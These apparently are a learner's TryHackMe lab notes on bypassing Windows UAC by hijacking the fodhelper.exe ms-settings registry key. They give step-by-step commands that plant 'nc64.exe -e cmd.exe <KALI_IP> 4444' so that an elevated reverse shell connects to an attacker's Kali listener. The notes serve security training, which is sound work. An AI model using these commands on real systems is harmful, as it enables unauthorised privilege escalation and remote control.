# LAB — Windows UAC Bypass

> **Lab**: [TryHackMe — Windows 10 PrivEsc](https://tryhackme.com/room/windows10privesc)
> **Concept**: UAC (User Account Control) enforces Medium Integrity on all processes by default, even for administrators — bypassing it elevates to High Integrity

---

## Theory

### What is UAC?

- UAC is a security mechanism ensuring no admin-level process runs without **explicit user consent**
- By default, **all processes** (even for admin users) run at **Medium Integrity**
- High-privilege actions require the user to approve a **consent prompt** (the "Do you want to allow this app..." dialog)

### UAC Bypass Prerequisites

All three conditions must be met:

| Condition | Requirement |
| --- | --- |
| UAC is **enabled** | `EnableLUA = 1` in registry |
| User is in the **Administrators group** | Must already be an admin |
| Current shell is **Medium Integrity** | Cannot jump from Low → High directly |

## Enumeration — Check UAC Status

### Registry Query

```cmd
reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin
```

```
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```

### UAC Level Reference

| Value | Level | Behavior |
| --- | --- | --- |
| **0** | Disabled (Never Notify) | No UAC prompt — elevation proceeds automatically |
| **2** | Always Notify | Prompts for consent/credentials for **any** system modification |
| **3** | Notify for apps only (no dim) | Prompts when apps make changes, not for user settings changes; desktop is **not dimmed** |
| **5** | **Default** | Same as 3 but **dims desktop** when consent prompts appear; **vulnerable to bypass** |

### Understanding `EnableLUA` vs Notification Level

| Registry Key | Purpose |
| --- | --- |
| `EnableLUA` | Controls whether UAC is functioning **at all** (`0` = off, `1` = on) |
| `ConsentPromptBehaviorAdmin` | Controls **how** UAC prompts when enabled |

```
EnableLUA = 0 → UAC is off → no prompt needed
EnableLUA = 1 + Level 5 → UAC is on → admin elevation produces Yes/No prompt
```

> [!IMPORTANT]
> `fodhelper.exe` is a legitimate Windows binary used to manage Windows Optional Features. Windows treats it as an **auto-elevated binary** — it bypasses UAC consent prompts automatically. The security issue comes from abusing how the auto-elevation mechanism interacts with **user-controlled registry settings**.

## Method 3 — `fodhelper.exe` (CMD Only — No GUI Required) ⭐

> [!TIP]
> This is the **most important** method — it works entirely from a command-line reverse shell with no GUI access.

![](attachments/Pasted%20image%2020260930142624.png)

### How `fodhelper.exe` Works

1. `fodhelper.exe` is an **auto-elevating** Windows binary (manages Optional Features)
2. When it runs at High Integrity, it queries the registry key:
   ```
   HKCU\Software\Classes\ms-settings\shell\open\command
   ```
3. If a `DelegateExecute` value exists (even empty), it executes the **default value** of that key at **High Integrity**
4. We write our malicious command as the default value → `fodhelper.exe` executes it elevated

### Step-by-Step Exploitation

#### Verify Current Integrity

```cmd
whoami /all
```

```
Mandatory Label\Medium Mandatory Level
```

#### Set Up a Second Listener

```bash
# Kali — new terminal
rlwrap -f . nc -lvnp 4444
```

#### Set Environment Variables

```cmd
set REG_KEY="HKCU\Software\Classes\ms-settings\Shell\Open\command"
set CMD="C:\Users\admin\nc64.exe -e cmd.exe <KALI_IP> 4444"
```

#### Create Registry Key & DelegateExecute Placeholder

```cmd
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
```

#### Set Malicious Command as Default Value

```cmd
reg add %REG_KEY% /d %CMD% /f
```

#### Trigger `fodhelper.exe`

```cmd
fodhelper.exe
```

## UAC Flow Diagram

### UAC = 5 (Default — Enabled)

```
Application requests elevation
    ↓
UAC prompt: "Do you want to allow this app..."
    ↓
Yes / No
    ↓
Elevated process (High Integrity)
```

### UAC = 0 (Disabled)

```
Application requests elevation
    ↓
No UAC prompt
    ↓
Elevation proceeds automatically
```

> [!NOTE]
> Disabling UAC (`EnableLUA = 0`) does **not** grant standard users admin rights. It only removes the consent/notification mechanism for users who are **already administrators**.
